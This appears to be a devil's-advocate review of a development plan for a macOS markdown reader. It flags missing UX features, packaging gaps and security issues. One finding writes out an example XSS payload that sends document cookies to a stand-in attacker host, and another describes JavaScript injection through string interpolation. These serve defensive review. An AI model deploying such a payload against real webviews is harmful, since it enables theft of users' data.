# Devil's Advocate — Challenge Report

**Deliverable:** PLAN.md for md-reader (macOS markdown reader/editor)
**Source of truth:** User's UX mockup (sidebar, folder picker, three view modes, native macOS look)
**Date:** 2026-04-18

---

## Summary

**11 findings: 3 P0, 4 P1, 4 P2**

**Verdict: BLOCK** — Three P0s present. The plan as written does not implement the UX the user described.

---

## P0 — Blocks Ship

### P0-1 (confidence: 10/10) — Missing: Left sidebar with file listing

**Decided:** UX mockup shows a left sidebar listing `.md` files from a chosen folder.
**Plan says:** "outline sidebar" is explicitly listed as **out of scope** (§5). Architecture is "one window = one document" (§3, decision #3). There is no `SidebarView`, no folder model, no file list component anywhere in the file breakdown (§2).
**Why it matters:** The sidebar IS the primary navigation UX. Without it, the app is a single-file editor with no way to browse a folder. This is not a deferrable feature — it's the core interaction model shown in the mockup.

### P0-2 (confidence: 10/10) — Missing: Three view modes (Preview | Split | Edit)

**Decided:** UX mockup shows a toolbar toggle with three modes: Preview, Split, Edit.
**Plan says:** `ContentView` is hardcoded as an `HSplitView` with editor left, preview right (§2). This is permanently in "Split" mode. There is no `ViewMode` enum, no toolbar toggle, no way to switch to Preview-only or Edit-only. The toolbar concept doesn't appear anywhere in the plan.
**Why it matters:** The user explicitly designed three modes. The plan delivers one. Preview-only mode (no editor visible) is the default reading experience — arguably the most important mode for a "reader" app.

### P0-3 (confidence: 10/10) — Missing: Folder picker / "Open Folder" workflow

**Decided:** UX mockup implies choosing a folder, then browsing its files in the sidebar.
**Plan says:** `FileCommands` only supports `openDocument()` via `NSOpenPanel` for individual files (§2). There is no "Open Folder" concept, no directory URL model, no recursive `.md` file discovery.
**Why it matters:** Without folder-level opening, the sidebar (P0-1) has nothing to populate. The entire left-panel UX depends on this.

---

## P1 — Must Fix Before Anyone Uses It

### P1-1 (confidence: 9/10) — SPM resource bundling not addressed

**Decided:** Resources (`marked.min.js`, `preview.html`, `preview.css`) live in `Sources/MdReader/Resources/`.
**Plan says:** `PreviewView` loads `preview.html` "from bundle" (§2), but the `Package.swift` manifest description (§2) doesn't mention `resources: [.copy("Resources/")]` or `.process()` directives. SPM does NOT automatically bundle resources — you must declare them explicitly in the target.
**Why it matters:** Without the resource declaration, `Bundle.module.url(forResource:)` returns nil at runtime. The preview pane will be blank. This is a guaranteed first-build failure that will confuse contributors.

### P1-2 (confidence: 8/10) — XSS via markdown → innerHTML

**Decided:** Plan acknowledges WebView security (§3, decision #7) — navigation delegate blocks external URLs.
**Plan says:** `render(md)` calls `marked.parse(md)` and injects result via `innerHTML` (§2, preview.html). But there's no mention of enabling `marked`'s `sanitize` option or using DOMPurify.
**Why it matters:** A markdown file containing `<img src=x onerror="fetch('http://evil.com/'+document.cookie)">` or `<script>` tags will execute in the WebView context. While WKWebView is sandboxed, it still has access to `file://` origins and could exfiltrate local file contents if `allowFileAccessFromFileURLs` is set. The plan doesn't specify this setting either way.

### P1-3 (confidence: 8/10) — No .app bundle strategy means no file association, no Dock icon, no Spotlight

**Decided:** Plan says packaging is "optional, future" (§4) with a vague "small Makefile target" comment.
**Plan says:** Ship as a bare binary via `swift build -c release` + symlink.
**Why it matters:** macOS users expect to double-click a `.md` file and have it open. A bare binary cannot register UTI file associations, has no icon, doesn't appear in Spotlight, and can't be dragged to the Dock. For an app whose UX mockup shows a polished macOS window, shipping without an `.app` bundle is a significant UX gap. At minimum, the plan needs an `Info.plist` and a basic bundle structure.

### P1-4 (confidence: 7/10) — No LICENSE file

**Decided:** The project is described as open-source.
**Plan says:** No LICENSE file in the file tree (§2). No license mentioned anywhere.
**Why it matters:** Without a LICENSE, the code is "all rights reserved" by default. Contributors can't legally use or fork it. The bundled `marked.min.js` is MIT-licensed — the plan should specify a compatible license and include the file.

---

## P2 — Important but Shippable

### P2-1 (confidence: 7/10) — `evaluateJavaScript` string escaping is a crash/injection vector

**Decided:** Plan says `evaluateJavaScript("render(\(escaped))")` (§2).
**Plan says:** The word "escaped" appears but no escaping strategy is specified. Markdown containing backticks, quotes, newlines, backslashes, or null bytes will break the JS string literal or inject arbitrary JS.
**Why it matters:** At best, preview breaks on certain documents. At worst, a crafted `.md` file executes arbitrary JS in the WebView. Proper approach: use `WKUserContentController.addUserScript` or `callAsyncJavaScript` with parameter passing (available macOS 13+) to avoid string interpolation entirely.

### P2-2 (confidence: 6/10) — No CI, no test target, no build verification

**Decided:** Open-source project should be buildable by contributors.
**Plan says:** No test target in the file tree. No GitHub Actions or CI config. No mention of testing strategy.
**Why it matters:** PRs will land without verification. SwiftUI + WKWebView is notoriously hard to test, but at minimum a build-only CI job (`swift build`) catches compilation regressions. A `Tests/` directory in the SPM layout is also conventional.

### P2-3 (confidence: 6/10) — No README content specified

**Decided:** File tree includes `README.md` (§2).
**Plan says:** Only "How to build/run" is mentioned. No screenshots, no feature description, no install instructions beyond build-from-source.
**Why it matters:** For an open-source project, the README is the landing page. Missing: project description, screenshot/GIF, system requirements (macOS 13+, Xcode CLI tools), Homebrew install (future), contributing guide.

### P2-4 (confidence: 5/10) — Scroll position lost on every render

**Decided:** Preview re-renders by replacing `innerHTML` on every keystroke (debounced 50ms).
**Plan says:** No mention of scroll position preservation.
**Why it matters:** When editing a long document, every keystroke will snap the preview back to the top. This makes the split view unusable for documents longer than one screen. Fix: save `scrollTop` before render, restore after.

---

## Not Flagged (Acknowledged Trade-offs)

These are things the plan explicitly decided and I agree are reasonable for v1:

- macOS 13+ only — fine
- UTF-8 only — fine
- No autosave — fine with dirty indicator
- No syntax highlighting in editor — fine for v1
- `marked.min.js` as vendored dep — fine
- One window per document — fine *if* the sidebar is added (otherwise contradicts the mockup)
